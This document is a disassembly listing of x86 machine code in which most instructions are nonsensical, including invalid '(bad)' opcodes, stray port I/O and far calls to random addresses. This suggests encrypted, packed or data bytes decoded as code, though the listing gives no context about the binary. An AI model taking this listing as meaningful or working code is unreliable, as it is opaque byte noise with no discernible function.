  41f13e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f13f:	jno    0x41f192
  41f141:	adc    al,0x0
	...
  41f1b3:	add    BYTE PTR [ebx-0x1988fe],ch
  41f1b9:	idiv   DWORD PTR [ebx-0x11ecebb1]
  41f1bf:	mov    DWORD PTR [eax+0x6d],esi
  41f1c2:	mov    ch,0xce
  41f1c4:	dec    edx
  41f1c5:	dec    esi
  41f1c6:	add    DWORD PTR [eax],eax
  41f1c8:	test   BYTE PTR [eax],0x0
  41f1cb:	add    ch,dh
  41f1cd:	xor    edx,ecx
  41f1cf:	or     ch,BYTE PTR [eax+0xf]
  41f1d2:	stos   DWORD PTR es:[edi],eax
  41f1d3:	mov    eax,ds:0xc5719bbe
  41f1d8:	std    
  41f1d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1da:	push   edi
  41f1db:	data16 daa 
  41f1dd:	adc    eax,0xbfda4e92
  41f1e2:	pop    edx
  41f1e3:	xchg   DWORD PTR [edx-0x12],eax
  41f1e6:	(bad)  
  41f1e7:	nop
  41f1e8:	stc    
  41f1e9:	icebp  
  41f1ea:	push   ds
  41f1eb:	pop    ecx
  41f1ec:	out    dx,eax
  41f1ed:	push   ebx
  41f1ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1ef:	mov    ecx,0xc7933fc4
  41f1f4:	pop    es
  41f1f5:	sbb    dh,BYTE PTR [esi+0x4b]
  41f1f8:	jg     0x41f1a9
  41f1fa:	aad    0x3f
  41f1fc:	cs sub cl,ah
  41f1ff:	test   DWORD PTR [esi+0x2f],edx
  41f202:	and    eax,0xeed2c7e1
  41f207:	pcmpgtw mm3,mm2
  41f20a:	xchg   esp,eax
  41f20b:	xchg   esi,eax
  41f20c:	ins    DWORD PTR es:[edi],dx
  41f20d:	mov    ds:0xb23bfa4b,eax
  41f212:	cs sbb edi,ecx
  41f215:	mov    bl,0xe
  41f217:	mov    ds:0xe35fca23,al
  41f21c:	jmp    0x41f26d
  41f21e:	push   esi
  41f21f:	or     DWORD PTR [eax+ebp*8],edx
  41f222:	mov    ss,WORD PTR [ecx]
  41f224:	addr16 mov esp,0x635c8f8e
  41f22a:	sub    eax,0x39e845af
  41f22f:	or     BYTE PTR [ecx],cl
  41f231:	mov    ch,0x2e
  41f233:	mov    WORD PTR ds:0x4139,cs
  41f238:	es push 0x7e
  41f23b:	pop    es
  41f23c:	pop    edx
  41f23d:	in     eax,dx
  41f23e:	ret    
  41f23f:	popa   
  41f240:	push   es
  41f241:	in     al,dx
  41f242:	stos   BYTE PTR es:[edi],al
  41f243:	pop    eax
  41f244:	sub    eax,edx
  41f246:	mov    ecx,0x464d77ca
  41f24b:	or     eax,0x37d71794
  41f250:	cli    
  41f251:	retf   
  41f252:	scas   eax,DWORD PTR es:[edi]
  41f253:	adc    BYTE PTR [ebx+ebx*1+0x77],dh
  41f257:	call   0x3d813354
  41f25c:	cmc    
  41f25d:	enter  0xf2b3,0xd4
  41f261:	std    
  41f262:	adc    DWORD PTR [eax+0x118d0f41],ecx
  41f268:	pop    ebx
  41f269:	bound  ebx,QWORD PTR [esi]
  41f26b:	sbb    al,0x58
  41f26d:	repnz or al,0x18
  41f270:	ins    DWORD PTR es:[edi],dx
  41f271:	ss inc eax
  41f273:	mov    al,BYTE PTR [ebp+0x39]
  41f276:	aam    0xd2
  41f278:	addr16 rcr dh,0xbd
  41f27c:	sahf   
  41f27d:	outs   dx,BYTE PTR ds:[esi]
  41f27e:	xor    eax,DWORD PTR [edx-0x402abaa0]
  41f284:	in     al,0x70
  41f286:	push   ebp
  41f287:	pop    ds
  41f288:	jbe    0x41f25b
  41f28a:	les    ebx,FWORD PTR [eax+0x49]
  41f28d:	inc    ebp
  41f28e:	jmp    0x843683cc
  41f293:	inc    ebp
  41f294:	fsubr  QWORD PTR [ebp-0x59]
  41f297:	push   ss
  41f298:	sbb    eax,0x714219d7
  41f29d:	jle    0x41f275
  41f29f:	jae    0x41f2eb
  41f2a1:	mov    esi,edi
  41f2a3:	out    dx,eax
  41f2a4:	imul   eax,DWORD PTR [ebp+0x66],0xffffffe7
  41f2a8:	sub    al,0x83
  41f2aa:	repz (bad) 
  41f2ac:	pop    ebx
  41f2ad:	push   ds
  41f2ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2af:	jl     0x41f2f1
  41f2b1:	mov    ch,0xcf
  41f2b3:	into   
  41f2b4:	mov    al,ds:0x719b9877
  41f2b9:	aas    
  41f2ba:	mov    WORD PTR [ecx-0x3d],ss
  41f2bd:	inc    edx
  41f2be:	mov    ebx,DWORD PTR [eax+ebp*2]
  41f2c1:	or     BYTE PTR [eax],al
	...
  41f333:	add    BYTE PTR [ecx-0xe088ee],cl
  41f339:	jg     0x41f324
  41f33b:	xchg   esi,eax
  41f33c:	call   0x9373:0x29531a0
  41f343:	xchg   BYTE PTR [eax+0x4f],al
  41f346:	add    DWORD PTR [eax],eax
  41f348:	test   BYTE PTR [eax],0x0
  41f34b:	add    BYTE PTR [edx],bh
  41f34d:	fwait
  41f34e:	shl    ch,cl
  41f350:	or     edi,ebx
  41f352:	ins    DWORD PTR es:[edi],dx
  41f353:	aam    0x82
  41f355:	inc    ebx
  41f356:	(bad)  
  41f358:	inc    ebx
  41f359:	jle    0x41f2f3
  41f35b:	loope  0x41f32b
  41f35d:	js     0x41f307
  41f35f:	rol    BYTE PTR [ecx+0x35],1
  41f362:	and    al,0xe3
  41f364:	enter  0xb74c,0xaf
  41f368:	js     0x41f3dd
  41f36a:	into   
  41f36b:	(bad)  
  41f36c:	xchg   esp,eax
  41f36d:	fmul   DWORD PTR [edx+0x5d]
  41f370:	cmp    eax,0x145008ff
  41f375:	mov    ds:0x2a24ecb3,al
  41f37a:	dec    ebx
  41f37b:	or     eax,0x167c2eb
  41f380:	adc    cl,BYTE PTR [esi]
  41f382:	dec    esp
  41f383:	push   ebx
  41f384:	xor    ch,dh
  41f386:	pop    esi
  41f387:	pop    ebp
  41f388:	leave  
  41f389:	aad    0x75
  41f38b:	adc    eax,DWORD PTR [edx]
  41f38d:	sub    BYTE PTR [ebp-0x3beb4a1b],dl
  41f393:	jp     0x41f3f0
  41f395:	rep lods eax,DWORD PTR ds:[esi]
  41f397:	adc    eax,0xa543a238
  41f39c:	shl    DWORD PTR [eax],cl
  41f39e:	xor    ch,BYTE PTR [ecx]
  41f3a0:	out    0x4d,eax
  41f3a2:	cmp    DWORD PTR [edx-0x20942a80],edi
  41f3a8:	mov    cl,0xec
  41f3aa:	or     al,0xf1
  41f3ac:	or     al,BYTE PTR [esi]
  41f3ae:	rcl    dh,0x7
  41f3b1:	jg     0x41f41e
  41f3b3:	(bad)  [ebx]
  41f3b5:	fld    st(1)
  41f3b7:	je     0x41f376
  41f3b9:	or     eax,DWORD PTR [ebp+0x4635e897]
  41f3bf:	cmp    dl,ah
  41f3c1:	pop    eax
  41f3c2:	les    ecx,FWORD PTR [edx+0x38f0d0c7]
  41f3c8:	push   0x21
  41f3ca:	mov    ebx,0xea76014b
  41f3cf:	mov    edx,0xdec4f24b
  41f3d4:	sbb    esi,0xffffff9a
  41f3d7:	pop    DWORD PTR [edx+0x52]
  41f3da:	cwde   
  41f3db:	in     eax,0x29
  41f3dd:	dec    esp
  41f3de:	add    BYTE PTR [edx+ecx*1-0xf4efa3d],al
  41f3e5:	jp     0x41f37f
  41f3e7:	ret    0x51ba
  41f3ea:	test   eax,0x39c04f8a
  41f3ef:	pop    edi
  41f3f0:	or     cl,BYTE PTR [esi+0x1c448428]
  41f3f6:	sahf   
  41f3f7:	push   cs
  41f3f8:	inc    eax
  41f3f9:	xor    BYTE PTR [edx],bh
  41f3fb:	xchg   ebp,eax
  41f3fc:	sub    DWORD PTR [ebx-0x4b52ff76],ebp
  41f402:	sub    al,0xcc
  41f405:	dec    esi
  41f406:	ds jnp 0x41f393
  41f409:	push   cs
  41f40a:	inc    ebx
  41f40b:	mov    edi,0x472f8e8c
  41f410:	dec    edi
  41f411:	cwde   
  41f412:	ins    BYTE PTR es:[edi],dx
  41f413:	and    dh,cl
  41f415:	mov    ebp,0x5b6abcff
  41f41a:	out    0x6c,eax
  41f41c:	sar    BYTE PTR [edx+0xa0eb9bb],1
  41f422:	shl    ecx,0x3f
  41f425:	fbstp  TBYTE PTR [ecx]
  41f427:	ror    ebx,cl
  41f429:	(bad)  
  41f42b:	lods   al,BYTE PTR ds:[esi]
  41f42c:	rcl    DWORD PTR [edx],1
  41f42e:	jb     0x41f3bd
  41f430:	xor    DWORD PTR [ebp-0x6aaabf32],0xb1c328c0
  41f43a:	dec    edx
  41f43b:	xchg   edi,eax
  41f43c:	and    eax,0xa2bf7577
  41f441:	cld    
	...
  41f4b2:	add    BYTE PTR [eax],al
  41f4b4:	and    BYTE PTR [edx-0x35],ch
  41f4b7:	dec    ebx
  41f4b8:	retf   
  41f4b9:	jmp    0x41f45b
  41f4bb:	imul   ebx,DWORD PTR [ebx],0xfffffff6
  41f4be:	xchg   esp,eax
  41f4bf:	aad    0x74
  41f4c1:	push   eax
  41f4c2:	pop    edi
  41f4c3:	pop    ebp
  41f4c4:	ss push eax
  41f4c6:	add    DWORD PTR [eax],eax
  41f4c8:	test   BYTE PTR [eax],0x0
  41f4cb:	add    BYTE PTR [edx+0x46],bh
  41f4ce:	sub    esi,DWORD PTR [edx]
  41f4d0:	cmp    ch,BYTE PTR [ecx]
  41f4d2:	and    bh,BYTE PTR [ebx-0x1f]
  41f4d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4d6:	and    cl,cl
  41f4d8:	fidiv  WORD PTR [edi]
  41f4da:	vmovlpd xmm5,xmm2,QWORD PTR [ecx+0x307436f6]
  41f4e2:	shl    DWORD PTR [edx-0x46f7f579],cl
  41f4e8:	jnp    0x41f4a2
  41f4ea:	fsub   QWORD PTR [eax-0x3bcee5b0]
  41f4f0:	push   edi
  41f4f1:	pop    edi
  41f4f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4f3:	pop    edx
  41f4f4:	xchg   ebx,eax
  41f4f5:	lock push edi
  41f4f7:	cli    
  41f4f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4f9:	sub    DWORD PTR [edi],0x90d9b54b
  41f4ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f500:	mov    bl,0xe6
  41f502:	mov    esi,DWORD PTR [ecx]
  41f504:	mov    esp,DWORD PTR [eax+edx*4+0x76]
  41f508:	loope  0x41f535
  41f50a:	stos   BYTE PTR es:[edi],al
  41f50b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f50c:	outs   dx,DWORD PTR ds:[esi]
  41f50d:	jo     0x41f541
  41f50f:	fimul  WORD PTR [eax+0x42]
  41f512:	outs   dx,BYTE PTR ds:[esi]
  41f513:	sbb    BYTE PTR [edx+0x2a],ch
  41f516:	stc    
  41f517:	adc    esi,ebx
  41f519:	inc    esi
  41f51a:	call   0xd931fd88
  41f51f:	sbb    al,0x2e
  41f521:	inc    ecx
  41f522:	and    esi,DWORD PTR [esi+ebx*8-0x4]
  41f526:	ins    BYTE PTR es:[edi],dx
  41f527:	jns    0x41f4b8
  41f529:	lds    eax,FWORD PTR [ebp+0xe5d7fdb]
  41f52f:	mov    ebx,0xe553ff68
  41f534:	or     eax,0x265e638a
  41f539:	add    ebp,esp
  41f53b:	gs mov edi,0x9beeb181
  41f541:	push   ebp
  41f542:	fsubr  QWORD PTR [esp+ecx*1-0x70]
  41f546:	loopne 0x41f529
  41f548:	fistp  WORD PTR [edx]
  41f54a:	sbb    edi,edi
  41f54c:	out    0xa4,al
  41f54e:	lahf   
  41f54f:	not    BYTE PTR [edx+0x7241a12e]
  41f555:	sub    bl,BYTE PTR [eax]
  41f557:	push   0x63
  41f559:	idiv   ebp
  41f55b:	ds lahf 
  41f55d:	aad    0x29
  41f55f:	aam    0xcf
  41f561:	(bad)  
  41f562:	sar    BYTE PTR [ecx],0x20
  41f565:	mov    eax,0x70d8df53
  41f56a:	dec    esp
  41f56b:	ret    0xe568
  41f56e:	xchg   edi,eax
  41f56f:	sbb    esp,edi
  41f571:	retf   0x2eb5
  41f574:	ror    BYTE PTR [ebp+0x69dc2cbc],1
  41f57a:	fwait
  41f57b:	sub    al,0xa0
  41f57d:	clc    
  41f57e:	fidiv  DWORD PTR [edx]
  41f580:	cmp    DWORD PTR [eax+0x1d8ee09a],esp
  41f586:	jge    0x41f5d7
  41f588:	shl    dh,0xd1
  41f58b:	aam    0x1d
  41f58d:	dec    esp
  41f58e:	scas   eax,DWORD PTR es:[edi]
  41f58f:	out    0x8d,eax
  41f591:	js     0x41f56a
  41f593:	int3   
  41f594:	dec    ecx
  41f595:	popa   
  41f596:	aam    0xe3
  41f598:	cld    
  41f599:	retf   
  41f59a:	mov    es,WORD PTR [esi+edx*1-0x63]
  41f59e:	xor    BYTE PTR [edx*1+0x57e22678],bl
  41f5a5:	xchg   esp,eax
  41f5a6:	mov    ecx,0xd1e556bb
  41f5ab:	or     DWORD PTR [ebx+0x17],ebp
  41f5ae:	sub    edi,0x71
  41f5b1:	nop
  41f5b2:	rol    ecx,0xa2
  41f5b5:	loopne 0x41f62d
  41f5b7:	pusha  
  41f5b8:	shl    BYTE PTR [edx+0x2c],1
  41f5bb:	cmp    DWORD PTR [ebx-0x70],esi
  41f5be:	mov    al,0x1
  41f5c0:	loopne 0x41f5bb
	...
  41f632:	add    BYTE PTR [eax],al
  41f634:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41f63a:	cmc    
  41f63b:	cwde   
  41f63c:	and    eax,0xfb01e835
  41f641:	jp     0x41f666
  41f643:	fild   QWORD PTR [ecx+edx*2]
  41f646:	add    DWORD PTR [eax],eax
  41f648:	test   BYTE PTR [eax],0x0
  41f64b:	add    BYTE PTR [edi+0x500f778f],bh
  41f651:	xor    dh,BYTE PTR ds:0x445ad5f7
  41f657:	stos   BYTE PTR es:[edi],al
  41f658:	pop    ss
  41f659:	adc    DWORD PTR [eax-0x54],edx
  41f65c:	aam    0x30
  41f65e:	in     eax,dx
  41f65f:	sahf   
  41f660:	outs   dx,BYTE PTR ds:[esi]
  41f661:	fcom   QWORD PTR [ebx-0x6c1915fc]
  41f667:	nop
  41f668:	mov    bh,0x90
  41f66a:	xor    edx,DWORD PTR [edx+0x3b1518b1]
  41f670:	stc    
  41f671:	mov    dh,0xa0
  41f673:	xchg   ebp,eax
  41f674:	adc    al,0xd4
  41f676:	enter  0x8038,0xef
  41f67a:	mov    edx,0xd09343f2
  41f67f:	call   0xdaea474
  41f684:	push   ebp
  41f685:	mov    BYTE PTR [ecx],cl
  41f687:	add    dl,BYTE PTR ds:0xb83b78f4
  41f68d:	push   ecx
  41f68e:	gs add cl,ah
  41f691:	xchg   DWORD PTR [ebx+ebp*2-0x45],ebx
  41f695:	jmp    0x41f61d
  41f697:	imul   DWORD PTR [ebx+0x58]
  41f69a:	adc    al,0x1f
  41f69c:	jle    0x41f674
  41f69e:	cmp    al,0xb4
  41f6a0:	sub    ebx,DWORD PTR [ecx+0x6f]
  41f6a3:	mov    fs,ecx
  41f6a5:	fimul  WORD PTR [edx+0x53]
  41f6a8:	sbb    ebx,esi
  41f6aa:	xchg   esi,eax
  41f6ab:	pop    ss
  41f6ac:	hlt    
  41f6ad:	inc    esp
  41f6ae:	push   ss
  41f6af:	gs loop 0x41f6fc
  41f6b2:	outs   dx,BYTE PTR ds:[esi]
  41f6b3:	(bad)  
  41f6b5:	jmp    0x1b8:0xbddb57
  41f6bc:	(bad)  
  41f6bd:	fild   DWORD PTR [edx]
  41f6bf:	jecxz  0x41f675
  41f6c1:	fisubr DWORD PTR [esi+0x7a]
  41f6c4:	mov    al,0xa2
  41f6c6:	cli    
  41f6c7:	call   0x6b4103b4
  41f6cc:	(bad)  
  41f6cd:	xchg   ebx,eax
  41f6ce:	retf   
  41f6cf:	sub    ebx,edx
  41f6d1:	pusha  
  41f6d2:	mov    ch,0x37
  41f6d4:	sbb    edx,DWORD PTR [esi]
  41f6d6:	in     eax,dx
  41f6d7:	jns    0x41f68c
  41f6d9:	jb     0x41f689
  41f6db:	aaa    
  41f6dc:	or     esp,esi
  41f6de:	xor    DWORD PTR [edx-0x5],edx
  41f6e1:	jl     0x41f6d4
  41f6e3:	xor    eax,0x877e76a1
  41f6e8:	pop    edi
  41f6e9:	mov    dl,0x4d
  41f6eb:	cmp    al,0xc
  41f6ed:	mov    bl,0xdc
  41f6ef:	dec    edx
  41f6f0:	xor    ebx,DWORD PTR [esp+esi*8+0x21]
  41f6f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6f5:	push   esi
  41f6f6:	arpl   ax,di
  41f6f8:	(bad)  [esi+0x5e63f054]
  41f6fe:	out    0xdb,al
  41f700:	adc    eax,0xd8430dc2
  41f705:	xor    ebx,DWORD PTR [ecx+ecx*8-0x68b7b299]
  41f70c:	pop    esp
  41f70d:	out    dx,eax
  41f70e:	es stos BYTE PTR es:[edi],al
  41f710:	mov    al,0x69
  41f712:	out    dx,eax
  41f713:	cwde   
  41f714:	jbe    0x41f698
  41f716:	dec    ecx
  41f717:	fs push eax
  41f719:	jne    0x41f713
  41f71b:	jno    0x41f797
  41f71d:	fnsave [eax]
  41f71f:	out    dx,al
  41f720:	inc    eax
  41f721:	ja     0x41f6fe
  41f723:	push   edi
  41f724:	mov    eax,ss:0x50e56fca
  41f72a:	mov    al,ds:0x4fbfad0c
  41f72f:	int    0xbb
  41f731:	ja     0x41f724
  41f733:	loopne 0x41f77b
  41f735:	sub    eax,0x2a05d769
  41f73a:	test   BYTE PTR [edx+0x70ccc3e1],bl
  41f740:	(bad)  
  41f741:	xor    al,BYTE PTR [eax]
	...
  41f7b3:	add    BYTE PTR ds:0x9e5c8a39,ch
  41f7b9:	(bad)  
  41f7ba:	(bad)  
  41f7bb:	jns    0x41f77e
  41f7bd:	clc    
  41f7be:	mov    ah,0x9e
  41f7c0:	stos   BYTE PTR es:[edi],al
  41f7c1:	sbb    edx,esi
  41f7c3:	xchg   esi,eax
  41f7c4:	and    dl,BYTE PTR [edx+0x1]
  41f7c7:	add    dh,dh
  41f7c9:	add    BYTE PTR [eax],al
  41f7cb:	add    dl,cl
  41f7cd:	cmp    eax,0x9c9fd221
  41f7d2:	leave  
  41f7d3:	dec    edi
  41f7d4:	pop    ss
  41f7d5:	sbb    DWORD PTR [ebx+0x4065c8e8],esi
  41f7db:	retf   0x3a1e
  41f7de:	das    
  41f7df:	or     eax,0xe7f17f98
  41f7e4:	sub    DWORD PTR [esi+0x5cc26a6d],ecx
  41f7ea:	mov    ah,0x80
  41f7ec:	gs mov ah,0x61
  41f7ef:	or     eax,0xa1168970
  41f7f4:	fucomp st(2)
  41f7f6:	rcl    DWORD PTR [eax-0x4f],1
  41f7f9:	enter  0x136a,0xeb
  41f7fd:	ins    DWORD PTR es:[edi],dx
  41f7fe:	aaa    
  41f7ff:	mov    cl,0xc7
  41f801:	fwait
  41f802:	adc    al,0xb5
  41f804:	ret    
  41f805:	jge    0x41f818
  41f807:	xlat   BYTE PTR ds:[ebx]
  41f808:	loop   0x41f7ef
  41f80a:	jmp    0x41f7a8
  41f80c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f80d:	in     eax,0x82
  41f80f:	neg    DWORD PTR [edi]
  41f811:	push   ebx
  41f812:	fiadd  DWORD PTR [esi+0x72]
  41f815:	jge    0x41f87e
  41f817:	dec    esp
  41f818:	daa    
  41f819:	(bad)  
  41f81b:	mov    BYTE PTR [ebp+0x4dfe82c9],cl
  41f821:	cmp    esp,ebp
  41f823:	dec    ebp
  41f824:	and    ebx,DWORD PTR [edi-0xd]
  41f827:	pop    ss
  41f828:	and    DWORD PTR [edi+0x556eba21],0xffffffcd
  41f82f:	push   ebx
  41f830:	inc    ebx
  41f831:	and    eax,0xa285b941
  41f836:	sub    ah,BYTE PTR [edi]
  41f838:	addr16 (bad) 
  41f83a:	popa   
  41f83b:	and    ebp,edx
  41f83d:	xor    eax,0x9c5acfce
  41f842:	es jle 0x41f825
  41f845:	lahf   
  41f846:	inc    DWORD PTR [ebx-0x4b]
  41f849:	add    DWORD PTR [eax-0x2c],edx
  41f84c:	test   BYTE PTR [edx+0x661dfd94],bh
  41f852:	dec    eax
  41f853:	pushf  
  41f854:	mov    BYTE PTR [edi-0x6c91324c],dh
  41f85a:	push   es
  41f85b:	mov    DWORD PTR [ecx],edx
  41f85d:	js     0x41f82d
  41f85f:	mov    bl,bh
  41f861:	pop    edx
  41f862:	cs jmp 0x41f841
  41f865:	icebp  
  41f866:	mov    WORD PTR [ecx],cs
  41f868:	inc    edi
  41f869:	jo     0x41f89f
  41f86b:	jl     0x41f89d
  41f86d:	jnp    0x41f85a
  41f86f:	loope  0x41f840
  41f871:	(bad)  
  41f872:	shl    DWORD PTR [ebx+0x46089131],0xbe
  41f879:	cdq    
  41f87a:	pop    esp
  41f87b:	mov    ecx,0x63b2f2c9
  41f880:	aaa    
  41f881:	mov    al,fs:0x813ad310
  41f887:	addr16 pop edx
  41f889:	fmul   st,st(3)
  41f88b:	icebp  
  41f88c:	fidivr DWORD PTR [ecx]
  41f88e:	stc    
  41f88f:	jp     0x41f8b3
  41f891:	inc    edx
  41f892:	bound  esi,QWORD PTR [bx+si]
  41f895:	adc    BYTE PTR [ecx+0x3f7f241a],dh
  41f89b:	in     al,0x53
  41f89d:	pop    edx
  41f89e:	lahf   
  41f89f:	xchg   ecx,eax
  41f8a0:	shl    DWORD PTR [ebx],cl
  41f8a2:	mov    eax,0xdd3204ef
  41f8a7:	xor    DWORD PTR [ebx-0x322946b4],esi
  41f8ad:	cmp    bh,BYTE PTR [edi-0x3c]
  41f8b0:	mov    dh,0x35
  41f8b2:	scas   eax,DWORD PTR es:[edi]
  41f8b3:	pop    es
  41f8b4:	mov    BYTE PTR [esi+0x35],dh
  41f8b7:	cdq    
  41f8b8:	sbb    DWORD PTR fs:[esi-0x4a],edx
  41f8bc:	(bad)  
  41f8bd:	adc    WORD PTR [edx],sp
  41f8c0:	fldl2t 
	...
  41f932:	add    BYTE PTR [eax],al
  41f934:	js     0x41f933
  41f936:	ret    0xc766
  41f939:	jg     0x41f937
  41f93b:	(bad)  
  41f93c:	mov    ecx,0x4b9ffef7
  41f941:	ins    DWORD PTR es:[edi],dx
  41f942:	outs   dx,BYTE PTR ds:[esi]
  41f943:	daa    
  41f944:	sbb    BYTE PTR [ebx+0x1],dl
  41f947:	add    dh,dh
  41f949:	add    BYTE PTR [eax],al
  41f94b:	add    BYTE PTR [esi+0x535aeadd],al
  41f951:	dec    edx
  41f952:	mov    al,ds:0xb44ad478
  41f957:	cli    
  41f958:	sub    al,0x99
  41f95a:	aaa    
  41f95b:	jns    0x41f959
  41f95d:	and    eax,0xe7e324f0
  41f962:	dec    eax
  41f963:	or     eax,0xefcbe136
  41f968:	pop    ebx
  41f969:	fs push es
  41f96b:	xchg   esi,eax
  41f96c:	dec    eax
  41f96d:	mov    ds:0x31c0e2f5,eax
  41f972:	sar    BYTE PTR [eax+0x69],cl
  41f975:	nop
  41f976:	repnz daa 
  41f978:	cs mov eax,0xb1c56755
  41f97e:	imul   DWORD PTR [ecx-0x3e94b488]
  41f984:	add    edx,DWORD PTR [edi+eiz*2+0x7a]
  41f988:	sub    DWORD PTR [esi],0x9ee0ec2c
  41f98e:	push   ds
  41f98f:	or     BYTE PTR [eax+0x70],ch
  41f992:	lock and DWORD PTR [esi+ecx*1],esi
  41f996:	lods   eax,DWORD PTR ds:[esi]
  41f997:	mov    ecx,ebp
  41f999:	mov    bh,0xe
  41f99b:	pop    ss
  41f99c:	mov    edi,edx
  41f99e:	fist   DWORD PTR [ebx]
  41f9a0:	and    ebp,DWORD PTR [ebp-0x20]
  41f9a3:	adc    DWORD PTR [edi],ebp
  41f9a5:	jns    0x41f9a2
  41f9a7:	mov    BYTE PTR [edi-0x5a5d6530],ch
  41f9ad:	jmp    0x41fa19
  41f9af:	jns    0x41fa17
  41f9b1:	push   0xcb077a12
  41f9b6:	cli    
  41f9b7:	sbb    bl,BYTE PTR [edx-0xffdf260]
  41f9bd:	arpl   WORD PTR [edx+0x51117960],bp
  41f9c3:	fmulp  st(5),st
  41f9c5:	mov    cl,0x2b
  41f9c7:	add    al,0xc2
  41f9c9:	cmp    DWORD PTR [edx],ebp
  41f9cb:	push   ecx
  41f9cc:	ins    BYTE PTR es:[edi],dx
  41f9cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9ce:	repnz retf 0xe2e0
  41f9d2:	lods   eax,DWORD PTR ds:[esi]
  41f9d3:	jnp    0x41fa0d
  41f9d5:	inc    ebx
  41f9d6:	mov    DWORD PTR ds:0x2407e06e,edx
  41f9dc:	mov    ds:0x34ec35c8,eax
  41f9e1:	mov    ds:0x91cd8ff4,eax
  41f9e6:	xchg   edi,eax
  41f9e7:	in     eax,0x72
  41f9e9:	aam    0x1c
  41f9eb:	xor    eax,0x5001947a
  41f9f0:	sbb    al,0x9b
  41f9f2:	daa    
  41f9f3:	into   
  41f9f4:	mov    ecx,0xd2ecdeac
  41f9f9:	or     DWORD PTR [ebp+ebp*2+0x109ece1f],ebx
  41fa00:	cmp    DWORD PTR [esi*1+0x27f4119b],0xf738a35
  41fa0b:	mov    al,0x43
  41fa0d:	jae    0x41fa27
  41fa0f:	(bad)  
  41fa10:	test   al,0x5a
  41fa12:	std    
  41fa13:	push   edx
  41fa14:	inc    ebx
  41fa15:	pop    eax
  41fa16:	fsub   QWORD PTR [esi+eax*2+0x3663f9e8]
  41fa1d:	repnz fwait
  41fa1f:	mov    eax,0xddaba63d
  41fa24:	aaa    
  41fa25:	out    0x62,al
  41fa27:	and    ah,BYTE PTR [ecx-0x4d]
  41fa2a:	pusha  
  41fa2b:	inc    esp
  41fa2c:	nop
  41fa2d:	addr16 add eax,0x26e6ad74
  41fa33:	clc    
  41fa34:	mov    ebp,0x86037cf3
  41fa39:	lods   al,BYTE PTR ds:[esi]
  41fa3a:	fidiv  DWORD PTR [ecx-0x42]
  41fa3d:	adc    al,0xc0
  41fa3f:	popf   
  41fa40:	ins    BYTE PTR es:[edi],dx
  41fa41:	xlat   BYTE PTR ds:[ebx]
	...
  41fab2:	add    BYTE PTR [eax],al
  41fab4:	adc    ch,BYTE PTR [edi]
  41fab6:	mov    esi,DWORD PTR [edi+edi*4+0x4eaf3fb4]
  41fabd:	cwde   
  41fabe:	out    dx,eax
  41fabf:	daa    
  41fac0:	sub    DWORD PTR [edi],0x57
  41fac3:	mov    dl,0xe
  41fac5:	push   esp
  41fac6:	add    DWORD PTR [eax],eax
  41fac8:	test   BYTE PTR [eax],0x0
  41facb:	add    BYTE PTR [edi+0x1ac3498a],ah
  41fad1:	call   0x240a:0x3a40ed63
  41fad8:	sahf   
  41fad9:	out    dx,al
  41fada:	mov    ds:0x812d6cf,eax
  41fadf:	call   0xbdfd:0x8e43cb0f
  41fae6:	sub    ebx,DWORD PTR ds:0xb0cbe703
  41faec:	xchg   bl,dh
  41faee:	fisub  WORD PTR [ecx-0x6c]
  41faf1:	cmp    al,0xbb
  41faf3:	ss sub bl,dl
  41faf6:	cmp    BYTE PTR [edi-0xe],ch
  41faf9:	aaa    
  41fafa:	adc    DWORD PTR [edi],0x4f041563
  41fb00:	xor    esp,DWORD PTR [eax+0x64]
  41fb03:	pop    ebx
  41fb04:	test   bl,ch
  41fb06:	cs out dx,al
  41fb08:	cmp    BYTE PTR [esi+0x3fc485b3],0x45
  41fb0f:	or     eax,DWORD PTR [ecx-0x18]
  41fb12:	retf   0xbf09
  41fb15:	inc    edx
  41fb16:	loop   0x41fb6e
  41fb18:	out    0xc9,eax
  41fb1a:	mov    ebx,0xfdb32ca6
  41fb1f:	(bad)  
  41fb20:	arpl   sp,bx
  41fb22:	inc    eax
  41fb23:	dec    esi
  41fb24:	je     0x41fb99
  41fb26:	stos   BYTE PTR es:[edi],al
  41fb27:	jo     0x41fb7c
  41fb29:	nop
  41fb2a:	cdq    
  41fb2b:	sar    DWORD PTR [ecx+0x47],cl
  41fb2e:	pop    esi
  41fb2f:	add    ebp,DWORD PTR [edx-0x62a44da0]
  41fb35:	push   esi
  41fb36:	nop
  41fb37:	test   al,0xda
  41fb39:	and    bh,BYTE PTR [edi+0x6ec9c964]
  41fb3f:	pop    esp
  41fb40:	xor    eax,0x36aebb26
  41fb45:	adc    eax,0x6981075c
  41fb4a:	clc    
  41fb4b:	xlat   BYTE PTR ds:[ebx]
  41fb4c:	popf   
  41fb4d:	js     0x41fb0a
  41fb4f:	js     0x41fbcb
  41fb51:	sbb    al,0xb9
  41fb53:	jne    0x41fb73
  41fb55:	rcr    DWORD PTR [ebx+0x17169b04],1
  41fb5b:	das    
  41fb5c:	aaa    
  41fb5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb5e:	add    al,0xfd
  41fb60:	outs   dx,DWORD PTR ds:[esi]
  41fb61:	loop   0x41fb50
  41fb63:	sbb    ah,ch
  41fb65:	into   
  41fb66:	arpl   WORD PTR [ecx+0x1c00b792],cx
  41fb6c:	mov    cl,0xe1
  41fb6e:	sbb    BYTE PTR [edx-0x3f01af49],dh
  41fb74:	inc    ebp
  41fb75:	repnz std 
  41fb77:	pushf  
  41fb78:	dec    ebx
  41fb79:	push   edx
  41fb7a:	cmc    
  41fb7b:	add    eax,0x36a0e486
  41fb80:	xchg   ebp,eax
  41fb81:	call   0x8b849492
  41fb86:	adc    BYTE PTR [ecx+ecx*1],dl
  41fb89:	clc    
  41fb8a:	or     al,0x4
